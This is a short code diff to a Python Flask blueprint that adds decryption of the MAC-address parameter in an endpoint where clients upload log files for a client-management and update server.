@@ -1,12 +1,13 @@
 from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
 from datetime import datetime
 import os, time, json, threading
-from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE
+from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data
 
 bp = Blueprint('log', __name__)
 
 @bp.route('/api/upload_log/<mac>', methods=['POST'])
 def api_upload_log(mac):
+    mac = decrypt_data(mac)
     f = request.files.get('file')
     if f:
         log_dir = os.path.join(UPDATE_DIR, 'client_logs')
